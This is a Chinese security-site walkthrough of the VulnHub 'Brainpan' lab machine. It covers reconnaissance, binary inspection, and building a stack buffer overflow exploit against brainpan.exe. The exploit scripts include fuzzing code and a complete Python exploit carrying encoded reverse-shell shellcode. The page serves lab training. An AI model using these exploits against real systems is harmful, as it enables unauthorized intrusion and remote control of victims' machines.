<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/layer.js"></script>
<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
<script src="static/js/new/setint.js" type="text/javascript"></script>
<script src="static/js/colum/swiper-3.4.2.min.js"></script>
<script type="application/ecmascript">
    $('.icon-wechat').hover(function(){
        $('.wechatImgdiv').show()
    },function(){
        $('.wechatImgdiv').hide()
    })
</script>
<script src="static/js/header/header.js" type="text/javascript"></script>
<script>
		jQuery(window).load(function () {
			jQuery(".main-header").sticky({topSpacing: 0});
		});
	</script>
<script>
                    $('.user-detial .test-info').mouseover(function() {
                        var _title = $(this).find('.text').attr('data-title');
                        if (_title) {
                            var str = '<span class="text-title">' + _title + '</span>';
                            $(this).append(str);
                        }
                    }).mouseout(function() {
                        $('.user-detial .test-info .text-title').remove();
                    });
                </script>
<script type="text/javascript">
				jQuery("#pagination a").live("click", function () {
					var _url = jQuery(this).attr("href");
					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
					jQuery.ajax({
						type: "POST",
						url: _url + "#timeline",
						success: function (data) {
							result = jQuery(data).find("#timeline .news_inner");
							nextHref = jQuery(data).find("#pagination a").attr("href");
							if (nextHref != undefined) {
								jQuery("#pagination a").attr("href", nextHref);
							} else {
								jQuery("#pagination").remove();
							}
							jQuery(function () {
								if (_url.indexOf("page") < 1) {
									jQuery("#timeline").html('');
								}
								jQuery("#timeline").append(result.fadeIn(200));
							});
						}
					});
					return false;
				});
			</script>
<script>
    $('.star_score > a').click(function() {
        $(this).addClass('active');
        $(this).siblings().removeClass('active');
    });
    $('.star_score > a').hover(function() {
        $(this).siblings().removeClass('active');
    });
    $(document).on('click', function() {
        $('.bottom_tools .tips-wrap').hide(500);
    });
    $('.bottom_tools ul li.fb-tips').click(function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $(this).find('.tips-wrap').toggle(500);
    });
    $('.bottom_tools .tips-wrap').click(function(event) {
        var evt = evt || event;
        evt.stopPropagation();
        $(this).show();
    });
    $('.feedback').on('click',function () {
        var content = $('#feedback-content').val();
        if(!content){
            $('#feedback-content').focus();
            $('.feedback-error').text('反馈内容不能为空！').show();
            return;
        }
        var contact = $('#feedback-contact').val();
        if(!contact){
            $('#feedback-contact').focus();
            $('.feedback-error').text('联系方式不能为空！').show();
            return;
        }
        var score = $('.star_score').children('.active').attr('data-id')
        if(!score){
            $('.feedback-error').text('给FreeBuf打个分吧！').show();
            return;
        }
        var yzm = $('#yzm').val();
        var _url = 'static/verify';
        $.ajax({
            type: "post",
            url: _url,
            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
            success: function (data) {
                $("#captcha").trigger('click')
                if(data.code ==200){
                    layer.open({
                        title: '系统提示',
                        btnAlign: 'c',
                        content: data.msg,
                        area: '278px',
                    });
                }else {
                    layer.open({
                        title: '系统提示',
                        btnAlign: 'c',
                        content: data.msg,
                        area: '278px',
                    });
                }
            },
        })
    })

    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap-public').show();
    });
    $(document).on('click', '.appeal-main .close', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap').hide();
    });
    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap-public').hide();
    });

    $('.complain').on('click',function () {
        var _url = 'static/verify';
        var token = $('#complain_token').val();
        $.ajax({
            type: "post",
            url: _url,
            data: {'complain_token':token,'complain_status':1},
            success: function (data) {
            },
        })
    })
</script>
<script src="static/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'static',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>

<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
<link href="static/css/new/header.css" rel="stylesheet"/>
<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>

<div id="contenttxt">
                            <h1>下载地址</h1>
<pre>https://download.vulnhub.com/brainpan/Brainpan.zip</pre>
<h1><b>实战演练</b></h1>
<p>netdiscover命令查找靶机的IP</p>
<p><img alt="image.png" data-original="images/20190802/1564734801_5d43f5514afe3.png" src="images/20190802/1564734801_5d43f5514afe3.png" width="741" height="230" />使用nmap查看靶机开放了那些端口</p>
<noscript><img alt="image.png" src="images/20190802/1564734801_5d43f5514afe3.png" width="741" height="230" />使用nmap查看靶机开放了那些端口</p></noscript>
<p><img alt="image.png" data-original="images/20190802/1564735064_5d43f6588c572.png" src="images/20190802/1564735064_5d43f6588c572.png" width="1200" height="767" />nc 9999端口，拒绝访问</p>
<noscript><img alt="image.png" src="images/20190802/1564735064_5d43f6588c572.png" width="1200" height="767" />nc 9999端口，拒绝访问</p></noscript>
<p><img alt="image.png" data-original="images/20190802/1564736593_5d43fc512a56e.png" src="images/20190802/1564736593_5d43fc512a56e.png" width="795" height="322" /></p>
<noscript><img alt="image.png" src="images/20190802/1564736593_5d43fc512a56e.png" width="795" height="322" /></p></noscript>
<p></p>
<p>10000端口是个HTTP服务器，浏览器打开</p>
<p><img alt="image.png" data-original="images/20190802/1564735160_5d43f6b83ffdd.png" src="images/20190802/1564735160_5d43f6b83ffdd.png" width="1200" height="807" /></p>
<noscript><img alt="image.png" src="images/20190802/1564735160_5d43f6b83ffdd.png" width="1200" height="807" /></p></noscript>
<p>没看到有什么东西，目录爆破一下。找到了一个bin目录</p>
<p><img alt="image.png" src="images/20190802/1564735356_5d43f77ca819f.png" width="793" height="504" /><img alt="image.png" data-original="images/20190802/1564735391_5d43f79f2f43c.png" src="images/20190802/1564735391_5d43f79f2f43c.png" width="690" height="258" />下载这个exe文件，查看信息。</p>
<noscript><img alt="image.png" src="images/20190802/1564735356_5d43f77ca819f.png" width="793" height="504" /><img alt="image.png" src="images/20190802/1564735391_5d43f79f2f43c.png" width="690" height="258" />下载这个exe文件，查看信息。</p></noscript>
<pre>root@kali:~# file brainpan.exe 
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows


root@kali:~# strings brainpan.exe 
This program cannot be run in DOS mode.
.text
`.data
.rdata
@.bss
.idata
[^_]
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
[^_]
[get_reply] s = [%s]
[get_reply] copied %d bytes to buffer
shitstorm
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|
[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              
                          &gt;&gt; 
                          ACCESS DENIED
                          ACCESS GRANTED
[+] initializing winsock...
[] winsock init failed: %d
done.
[] could not create socket: %d
[+] server socket created.
[] bind failed: %d
[+] bind done on port %d
[+] waiting for connections.
[+] received connection.
[+] check is %d
[] accept failed: %d
[+] cleaning up.
-LIBGCCW32-EH-3-SJLJ-GTHR-MINGW32
w32_sharedptr-&gt;size == sizeof(W32_EH_SHARED)
../../gcc-3.4.5/gcc/config/i386/w32-shared-ptr.c
GetAtomNameA (atom, s, sizeof(s)) = 0
AddAtomA
ExitProcess
FindAtomA
GetAtomNameA
SetUnhandledExceptionFilter
__getmainargs
__p__environ
__p__fmode
__set_app_type
_assert
_cexit
_iob
_onexit
_setmode
abort
atexit
free
malloc
memset
printf
signal
strcmp
strcpy
strlen
WSACleanup
WSAGetLastError
WSAStartup
accept
bind
closesocket
htons
listen
recv
send
socket
KERNEL32.dll
msvcrt.dll
WS2_32.DLL
.file
crt1.c
_atexit
__onexit
.text
.data
.bss
.file
crtstuff.c
.text
.data
.bss
.file
brainpan.c
_main
.text
.data
.bss
.rdata
.text
.data
.bss
.idata$7
.idata$5h
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5|
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5
.idata$4
.idata$6&amp;
.text
.data
.bss
.idata$7
.idata$5t
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5x
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5
.idata$4
.idata$6.
.text
.data
.bss
.idata$7
.idata$5l
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5p
.idata$4
.idata$6
.file
fake
hname
fthunk
.text
.data
.bss
.idata$2(
.idata$5d
.idata$4
.file
fake
.text
.data
.bss
.idata$4
.idata$5
.idata$7
.file
CRTglob.c
.text
.data
.bss
.file
CRTfmode.c
.text
.data
.bss
.file
txtmode.c
.text
.data
.bss
.file
gccmain.c
___main
.text
.data
.bss
.file
pseudo-reloc.c
.text
.data
.bss
.file
cpu_features.c
.text
.data
.bss
.file
CRT_fp10.c
_fpreset@	
.text
.data
.bss
.file
.text
.data
.bss
.text
.data
.bss
.rdata
probe
done
.text
.data
.bss
.text
.data
.bss
.text
.data
.bss
.idata$7t
.idata$5,
.idata$4
.idata$6@
.text
.data
.bss
.idata$7h
.idata$5 
.idata$4|
.idata$6
.text
.data
.bss
.idata$7
.idata$5&lt;
.idata$4
.idata$6f
.text
.data
.bss
.idata$7x
.idata$50
.idata$4
.idata$6H
.text
.data
.bss
.idata$7p
.idata$5(
.idata$4
.idata$66
.text
.data
.bss
.idata$7`
.idata$5
.idata$4t
.idata$6
.text
.data
.bss
.idata$7
.idata$5P
.idata$4
.idata$6
.text
.data
.bss
.idata$7d
.idata$5
.idata$4x
.idata$6
.text
.data
.bss
.idata$7|
.idata$54
.idata$4
.idata$6R
.text
.data
.bss
.idata$7\
.idata$5
.idata$4p
.idata$6
.text
.data
.bss
.idata$7
.idata$5H
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5T
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5\
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5X
.idata$4
.idata$6
.text
.data
.bss
.idata$7
.idata$5L
.idata$4
.idata$6
.text
.data
.bss
.idata$7l
.idata$5$
.idata$4
.idata$6,
.text
.data
.bss
.idata$7
.idata$5@
.idata$4
.idata$6p
.text
.data
.bss
.idata$7
.idata$5D
.idata$4
.idata$6x
.text
.data
.bss
.idata$7
.idata$58
.idata$4
.idata$6^
.file
fake
hname
fthunk
.text
.data
.bss
.idata$2
.idata$5
.idata$4l
.file
fake
.text
.data
.bss
.idata$4
.idata$5`
.idata$7
.text
.data
.bss
.idata$7&lt;
.idata$5
.idata$4X
.idata$6
.text
.data
.bss
.idata$7H
.idata$5
.idata$4d
.idata$6
.text
.data
.bss
.idata$7D
.idata$5
.idata$4`
.idata$6
.text
.data
.bss
.idata$7@
.idata$5
.idata$4\
.idata$6
.text
.data
.bss
.idata$78
.idata$5
.idata$4T
.idata$6
.file
fake
hname
fthunk
.text
.data
.bss
.idata$2
.idata$5
.idata$4P
.file
fake
.text
.data
.bss
.idata$4h
.idata$5
.idata$7L
.file
crtstuff.c
.text
.data
.bss
.ctors
__cexit
_free
_strcmp
_recv@16
_bind@120
__dll__
_memset
__argc
_send@16
__allocap
__argv
__fmode
__end__
_signal
_malloc
_strcpy
_abort
_htons@48
_strlen
_printf
__assert
__gnu_exception_handler@4
___mingw_CRTStartup
_mainCRTStartup
_WinMainCRTStartup
___do_sjlj_init
_winkwink
_get_reply
_initialized
___do_global_dtors
___do_global_ctors
__pei386_runtime_relocator
___cpu_features_init
__fpreset
pseudo-reloc-list.c
_w32_atom_suffix
___w32_sharedptr_default_unexpected
___w32_sharedptr_get
dw2_object_mutex.0
dw2_once.1
sjl_fc_key.2
sjl_once.3
eh_globals_static.4
eh_globals_key.5
eh_globals_once.6
___w32_sharedptr_initialize
___sjlj_init_ctor
___RUNTIME_PSEUDO_RELOC_LIST__
__imp___setmode
__data_start__
___DTOR_LIST__
__imp__bind@12
__imp__recv@16
__imp___onexit
___p__fmode
_SetUnhandledExceptionFilter@4
___w32_sharedptr_terminate
___tls_start__
__libmsvcrt_a_iname
__imp__FindAtomA@4
__imp__abort
__size_of_stack_commit__
__size_of_stack_reserve__
__major_subsystem_version__
___crt_xl_start__
_AddAtomA@4
___crt_xi_start__
___chkstk
___crt_xi_end__
__imp____p__environ
__imp___iob
__bss_start__
__head_libws2_32_a
___RUNTIME_PSEUDO_RELOC_LIST_END__
__size_of_heap_commit__
__imp__listen@8
___p__environ
___crt_xp_start__
___crt_xp_end__
__imp__signal
__minor_os_version__
__imp__atexit
__head_libmsvcrt_a
_accept@12
__image_base__
__imp__accept@12
__section_alignment__
_socket@12
__RUNTIME_PSEUDO_RELOC_LIST__
__imp__htons@4
__imp____p__fmode
_ExitProcess@4
__data_end__
___getmainargs
___w32_sharedptr
__CTOR_LIST__
___set_app_type
__bss_end__
__CRT_fmode
___crt_xc_end__
__imp__WSAGetLastError@0
___crt_xc_start__
__imp__socket@12
__imp__closesocket@4
___CTOR_LIST__
__imp__GetAtomNameA@12
_WSAStartup@8
__imp__strcmp
__file_alignment__
__imp__malloc
__major_os_version__
__imp___assert
__DTOR_LIST__
__imp__memset
_WSAGetLastError@0
__size_of_heap_reserve__
___crt_xt_start__
__subsystem__
__imp__strlen
__imp__strcpy
___w32_sharedptr_unexpected
__imp____getmainargs
_listen@8
___tls_end__
__imp__ExitProcess@4
__imp__WSACleanup@0
__imp__send@16
___cpu_features
__imp__free
__imp__SetUnhandledExceptionFilter@4
__major_image_version__
__loader_flags__
__CRT_glob
__setmode
__imp__printf
__imp__AddAtomA@4
__head_libkernel32_a
__imp___cexit
__minor_subsystem_version__
__minor_image_version__
_closesocket@4
__imp____set_app_type
_FindAtomA@4
__imp__WSAStartup@8
_WSACleanup@0
_GetAtomNameA@12
__RUNTIME_PSEUDO_RELOC_LIST_END__
__libkernel32_a_iname
___crt_xt_end__
__libws2_32_a_iname
<br /></pre>
<p>看到<span style="color:rgb(0,0,0);"><b>strcpy</b>这个函数，可能存在缓冲区溢出漏洞</span></p>
<p>在<b>XP系统</b>上面使用<span>ImmunityDebugger进行调试，</span><span style="background-color:transparent;">点击运行按钮</span></p>
<p><img alt="image.png" data-original="images/20190802/1564739819_5d4408eb3db3d.png" src="images/20190802/1564739819_5d4408eb3db3d.png" width="1200" height="1043" /></p>
<noscript><img alt="image.png" src="images/20190802/1564739819_5d4408eb3db3d.png" width="1200" height="1043" /></p></noscript>
<p>payload</p>
<pre>root@kali:~# cat fuzz.py 
import sys,socket

victim = '192.168.0.103'
port = 9999

payload = "\x41" * 1000


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  print "[-] Connecting to " + str(victim)
  s.connect((victim, port))
  s.recv(1024)

  # Send payload 
  print "[-] Sending payload.... ",
  s.send(payload)
  print "Done"

except:
  print "[-] Unable to connect to " + str(victim)
  sys.exit(0)
</pre>
<p>运行py</p>
<p><img alt="image.png" data-original="images/20190802/1564739697_5d440871df116.png" src="images/20190802/1564739697_5d440871df116.png" width="786" height="498" />下一步，我们需要多少字节来填充缓冲区才能让我们进入<b>eip</b>？创造测试字符串</p>
<noscript><img alt="image.png" src="images/20190802/1564739697_5d440871df116.png" width="786" height="498" />下一步，我们需要多少字节来填充缓冲区才能让我们进入<b>eip</b>？创造测试字符串</p></noscript>
<p><img alt="image.png" data-original="images/20190802/1564740529_5d440bb18cd48.png" src="images/20190802/1564740529_5d440bb18cd48.png" width="1200" height="264" /></p>
<noscript><img alt="image.png" src="images/20190802/1564740529_5d440bb18cd48.png" width="1200" height="264" /></p></noscript>
<p>payload<br /><img alt="image.png" data-original="images/20190802/1564740595_5d440bf3640d5.png" src="images/20190802/1564740595_5d440bf3640d5.png" width="1200" height="581" /></p>
<noscript><img alt="image.png" src="images/20190802/1564740595_5d440bf3640d5.png" width="1200" height="581" /></p></noscript>
<p>我们可以看到EIP的位置已经被<span>35724134覆盖了</span></p>
<p><img alt="image.png" data-original="images/20190802/1564740669_5d440c3d075ac.png" src="images/20190802/1564740669_5d440c3d075ac.png" width="1200" height="971" /> 我们将其推入Metasploit的模式偏移工具，它将为我们提供我们需要发送到缓冲区以控制的字节数<code>eip</code></p>
<noscript><img alt="image.png" src="images/20190802/1564740669_5d440c3d075ac.png" width="1200" height="971" /> 我们将其推入Metasploit的模式偏移工具，它将为我们提供我们需要发送到缓冲区以控制的字节数<code>eip</code></p></noscript>
<p><img alt="image.png" data-original="images/20190802/1564742025_5d4411892409b.png" src="images/20190802/1564742025_5d4411892409b.png" width="847" height="85" /></p>
<noscript><img alt="image.png" src="images/20190802/1564742025_5d4411892409b.png" width="847" height="85" /></p></noscript>
<p>我们发送524个&#8221;A&#8221;，4个&#8221;B&#8221;和1000个&#8221;C&#8221;，看看什么效果</p>
<pre><span style="color:#008000;font-weight:bold;">import</span> <span style="color:rgb(14,132,181);font-weight:bold;">socket</span><span style="color:rgb(48,48,48);">,</span><span style="color:rgb(14,132,181);font-weight:bold;">sys</span>

junk <span style="color:rgb(48,48,48);">=</span> <span style="background-color:rgb(255,240,240);">"</span><span style="background-color:rgb(255,240,240);color:rgb(96,96,96);font-weight:bold;">\x41</span><span style="background-color:rgb(255,240,240);">"</span><span style="color:rgb(48,48,48);">*</span><span style="color:rgb(0,0,208);font-weight:bold;">524</span>
eip <span style="color:rgb(48,48,48);">=</span> <span style="background-color:rgb(255,240,240);">"</span><span style="background-color:rgb(255,240,240);color:rgb(96,96,96);font-weight:bold;">\x42</span><span style="background-color:rgb(255,240,240);">"</span><span style="color:rgb(48,48,48);">*</span><span style="color:rgb(0,0,208);font-weight:bold;">4</span>
shellcode <span style="color:rgb(48,48,48);">=</span> <span style="background-color:rgb(255,240,240);">"</span><span style="background-color:rgb(255,240,240);color:rgb(96,96,96);font-weight:bold;">\x43</span><span style="background-color:rgb(255,240,240);">"</span><span style="color:rgb(48,48,48);">*</span><span style="color:rgb(0,0,208);font-weight:bold;">1000</span>

payload <span style="color:rgb(48,48,48);">=</span> junk<span style="color:rgb(48,48,48);">+</span>eip<span style="color:rgb(48,48,48);">+</span>shellcode

s <span style="color:rgb(48,48,48);">=</span> socket<span style="color:rgb(48,48,48);">.</span>socket(socket<span style="color:rgb(48,48,48);">.</span>AF_INET,socket<span style="color:rgb(48,48,48);">.</span>SOCK_STREAM)
<span style="color:#008000;font-weight:bold;">try</span>:
    s<span style="color:rgb(48,48,48);">.</span>connect((<span style="background-color:rgb(255,240,240);">'192.168.2.14'</span>,<span style="color:rgb(0,0,208);font-weight:bold;">9999</span>)) <span># IP of WinXP SP3 machine running brainpan.exe</span>
<span style="color:#008000;font-weight:bold;">except</span>:
    <span style="color:#008000;font-weight:bold;">print</span> <span style="background-color:rgb(255,240,240);">"[-] Connection failed Noob"</span>
    sys<span style="color:rgb(48,48,48);">.</span>exit(<span style="color:rgb(0,0,208);font-weight:bold;">0</span>)
 
s<span style="color:rgb(48,48,48);">.</span>recv(<span style="color:rgb(0,0,208);font-weight:bold;">1024</span>)
s<span style="color:rgb(48,48,48);">.</span>send(payload)</pre>
<p>在EIP那里有4个42，被字符&#8221;B&#8221;填充了</p>
<p><img alt="image.png" data-original="images/20190802/1564742747_5d44145be1081.png" src="images/20190802/1564742747_5d44145be1081.png" width="1200" height="938" />让我们看看我们是否能找到<code>jmp esp</code>函数的地址。在Immunity Debugger中，使用<code>ctrl-f</code>并输入搜索<code>jmp esp</code>。正如您在下面看到的，我们的第一个地址<code>jmp esp</code>是<code>311712F3</code><b style="background-color:transparent;">重新运行程序</b></p>
<noscript><img alt="image.png" src="images/20190802/1564742747_5d44145be1081.png" width="1200" height="938" />让我们看看我们是否能找到<code>jmp esp</code>函数的地址。在Immunity Debugger中，使用<code>ctrl-f</code>并输入搜索<code>jmp esp</code>。正如您在下面看到的，我们的第一个地址<code>jmp esp</code>是<code>311712F3</code><b style="background-color:transparent;">重新运行程序</b></p></noscript>
<p><img alt="image.png" data-original="images/20190802/1564743528_5d441768c0d51.png" src="images/20190802/1564743528_5d441768c0d51.png" width="707" height="527" />生成反弹shell</p>
<noscript><img alt="image.png" src="images/20190802/1564743528_5d441768c0d51.png" width="707" height="527" />生成反弹shell</p></noscript>
<p><img alt="image.png" data-original="images/20190802/1564756579_5d444a63c324e.png" src="images/20190802/1564756579_5d444a63c324e.png" width="1200" height="690" />payload</p>
<noscript><img alt="image.png" src="images/20190802/1564756579_5d444a63c324e.png" width="1200" height="690" />payload</p></noscript>
<pre>root@kali:~# cat fuzz.py 
import sys,socket
 
victim = '192.168.0.101'
port = 9999
 
junk = "\x41" * 524
eip = "\xf3\x12\x17\x31" #jmp esp 311712F3 brainpan.exe
shellcode = "\x90" * 50 

buf =  ""
buf += "\xd9\xc5\xd9\x74\x24\xf4\xb8\x1e\xc6\x68\xe1\x5d\x31"
buf += "\xc9\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\x5b\xd5\x8a"
buf += "\x14\x9f\x31\xc8\xd7\x5f\xc2\xad\x5e\xba\xf3\xed\x05"
buf += "\xcf\xa4\xdd\x4e\x9d\x48\x95\x03\x35\xda\xdb\x8b\x3a"
buf += "\x6b\x51\xea\x75\x6c\xca\xce\x14\xee\x11\x03\xf6\xcf"
buf += "\xd9\x56\xf7\x08\x07\x9a\xa5\xc1\x43\x09\x59\x65\x19"
buf += "\x92\xd2\x35\x8f\x92\x07\x8d\xae\xb3\x96\x85\xe8\x13"
buf += "\x19\x49\x81\x1d\x01\x8e\xac\xd4\xba\x64\x5a\xe7\x6a"
buf += "\xb5\xa3\x44\x53\x79\x56\x94\x94\xbe\x89\xe3\xec\xbc"
buf += "\x34\xf4\x2b\xbe\xe2\x71\xaf\x18\x60\x21\x0b\x98\xa5"
buf += "\xb4\xd8\x96\x02\xb2\x86\xba\x95\x17\xbd\xc7\x1e\x96"
buf += "\x11\x4e\x64\xbd\xb5\x0a\x3e\xdc\xec\xf6\x91\xe1\xee"
buf += "\x58\x4d\x44\x65\x74\x9a\xf5\x24\x11\x6f\x34\xd6\xe1"
buf += "\xe7\x4f\xa5\xd3\xa8\xfb\x21\x58\x20\x22\xb6\x9f\x1b"
buf += "\x92\x28\x5e\xa4\xe3\x61\xa5\xf0\xb3\x19\x0c\x79\x58"
buf += "\xd9\xb1\xac\xcf\x89\x1d\x1f\xb0\x79\xde\xcf\x58\x93"
buf += "\xd1\x30\x78\x9c\x3b\x59\x13\x67\xac\xa6\x4c\x67\x46"
buf += "\x4f\x8f\x67\x87\xd3\x06\x81\xcd\xfb\x4e\x1a\x7a\x65"
buf += "\xcb\xd0\x1b\x6a\xc1\x9d\x1c\xe0\xe6\x62\xd2\x01\x82"
buf += "\x70\x83\xe1\xd9\x2a\x02\xfd\xf7\x42\xc8\x6c\x9c\x92"
buf += "\x87\x8c\x0b\xc5\xc0\x63\x42\x83\xfc\xda\xfc\xb1\xfc"
buf += "\xbb\xc7\x71\xdb\x7f\xc9\x78\xae\xc4\xed\x6a\x76\xc4"
buf += "\xa9\xde\x26\x93\x67\x88\x80\x4d\xc6\x62\x5b\x21\x80"
buf += "\xe2\x1a\x09\x13\x74\x23\x44\xe5\x98\x92\x31\xb0\xa7"
buf += "\x1b\xd6\x34\xd0\x41\x46\xba\x0b\xc2\x76\xf1\x11\x63"
buf += "\x1f\x5c\xc0\x31\x42\x5f\x3f\x75\x7b\xdc\xb5\x06\x78"
buf += "\xfc\xbc\x03\xc4\xba\x2d\x7e\x55\x2f\x51\x2d\x56\x7a"

payload = junk + eip + shellcode + buf 

print(payload)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
  print "[-] Connecting to " + str(victim)
  s.connect((victim, port))
  s.recv(1024)
 
  # Send payload 
  print "[-] Sending payload.... ",
  s.send(payload)
  print "Done"
 
except:
  print "[-] Unable to connect to " + str(victim)
  sys.exit(0)

<br /></pre>
<p>监听shell</p>
<p><img alt="image.png" data-original="images/20190802/1564757532_5d444e1c6eb6f.png" src="images/20190802/1564757532_5d444e1c6eb6f.png" width="680" height="170" /></p>
<noscript><img alt="image.png" src="images/20190802/1564757532_5d444e1c6eb6f.png" width="680" height="170" /></p></noscript>
<p>连接到windows机器</p>
<p><img alt="image.png" data-original="images/20190802/1564757416_5d444da8f2a96.png" src="images/20190802/1564757416_5d444da8f2a96.png" width="1200" height="752" />上面的是windows的shell，重新生成linux</p>
<noscript><img alt="image.png" src="images/20190802/1564757416_5d444da8f2a96.png" width="1200" height="752" />上面的是windows的shell，重新生成linux</p></noscript>
<p><img alt="image.png" data-original="images/20190802/1564757740_5d444eecdbd25.png" src="images/20190802/1564757740_5d444eecdbd25.png" width="1200" height="436" />再将上面的buf修改一下就行</p>
<noscript><img alt="image.png" src="images/20190802/1564757740_5d444eecdbd25.png" width="1200" height="436" />再将上面的buf修改一下就行</p></noscript>
<p><img alt="image.png" src="images/20190802/1564757879_5d444f778ee79.png" width="1200" height="455" /><br /><img alt="image.png" src="images/20190802/1564758199_5d4450b791bfa.png" width="846" height="371" /><img alt="image.png" data-original="images/20190802/1564758249_5d4450e9220d6.png" src="images/20190802/1564758249_5d4450e9220d6.png" width="1006" height="486" /></p>
<noscript><img alt="image.png" src="images/20190802/1564757879_5d444f778ee79.png" width="1200" height="455" /><br /><img alt="image.png" src="images/20190802/1564758199_5d4450b791bfa.png" width="846" height="371" /><img alt="image.png" src="images/20190802/1564758249_5d4450e9220d6.png" width="1006" height="486" /></p></noscript>
<p>提权成功<br /><img alt="image.png" data-original="images/20190802/1564758295_5d445117111ee.png" src="images/20190802/1564758295_5d445117111ee.png" width="843" height="261" /></p>
<noscript><img alt="image.png" src="images/20190802/1564758295_5d445117111ee.png" width="843" height="261" /></p></noscript>
                                
                                <div class="column-support">
                                    <p class="support-mount good_num"></p>
                                    <a href="javascript:void (0);" data-status="0" data-id="210238" class="good"></a>
                                </div>
                                <script>
                                    $('.good').on('click',function () {
